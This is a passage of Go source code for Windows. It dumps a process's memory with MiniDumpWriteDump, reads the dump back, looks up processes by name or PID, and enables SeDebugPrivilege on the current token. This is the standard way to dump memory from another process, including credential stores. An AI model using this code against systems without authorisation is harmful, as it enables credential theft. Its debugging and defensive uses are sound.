	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

	if r != 0 {
		mini["FileContent"], err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return mini, err
		}
	}
	return mini, nil
}

// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
// and the process ID.
func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

// sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}
